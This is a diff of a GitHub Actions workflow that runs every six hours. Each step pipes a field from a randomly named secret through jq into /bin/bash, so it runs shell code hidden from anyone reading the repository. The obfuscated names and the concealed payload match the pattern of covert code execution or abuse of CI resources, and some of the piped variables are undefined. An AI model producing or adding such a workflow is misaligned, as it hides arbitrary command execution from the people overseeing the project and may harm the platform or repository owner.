@@ -1,25 +1,21 @@
 name: joemoonx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 1/6 * * *'
+    - cron: '31 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: joemoonx
         env:
-          g391: ${{ secrets.g391 }}
+          dwzn17714: ${{ secrets.dwzn17714 }}
         run: |
-          echo $g391 | jq -r .uap8813 | /bin/bash
-          echo $r317 | jq -r .hugro28822 | /bin/bash
-          echo $ngvq50 | jq -r .bwds8 | /bin/bash
-          echo $nnfua60 | jq -r .cdyn4 | /bin/bash
-          echo $na946 | jq -r .faly30 | /bin/bash
-          echo $zygh48691 | jq -r .tu9067 | /bin/bash
-          echo $fk84 | jq -r .yds7490 | /bin/bash
-          echo $dyshv4 | jq -r .yln4019 | /bin/bash
-          echo $vef7905 | jq -r .lbu7439 | /bin/bash
+          echo $dwzn17714 | jq -r .cs2323 | /bin/bash
+          echo $md53685 | jq -r .mtlqq6797 | /bin/bash
+          echo $xg9887 | jq -r .wxv348 | /bin/bash
 
